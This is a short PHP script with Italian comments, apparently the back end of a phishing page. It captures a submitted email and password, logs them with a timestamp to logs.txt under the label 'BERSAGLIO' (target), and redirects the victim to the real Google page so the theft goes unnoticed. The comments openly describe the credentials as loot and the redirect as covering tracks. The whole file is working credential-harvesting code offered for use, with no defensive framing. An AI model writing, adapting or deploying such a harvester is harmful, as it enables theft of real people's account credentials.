<?php
// 1. Controlliamo se qualcuno ha effettivamente inviato il form (metodo POST)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // 2. Estraiamo il bottino usando le etichette (i "name") che abbiamo messo nell'HTML
    $email_catturata = $_POST['user_email'];
    $password_catturata = $_POST['user_password'];

    // 3. Prepariamo la riga di testo da salvare nel nostro database segreto
    $data_ora = date('Y-m-d H:i:s');
    $riga_log = "[$data_ora] BERSAGLIO: $email_catturata | PASSWORD: $password_catturata\n";

    // 4. Scriviamo fisicamente i dati in un file di testo (logs.txt)
    // FILE_APPEND assicura che i nuovi log si aggiungano sotto ai vecchi senza cancellarli
    file_put_contents("logs.txt", $riga_log, FILE_APPEND);

    // 5. Copertura tracce: Reindirizziamo la vittima alla VERA pagina (es. Google) 
    // Così l'utente penserà "Oh, ho sbagliato a digitare, riprovo" e non si insospettirà.
    header("Location: https://www.google.com");
    exit();
}
?>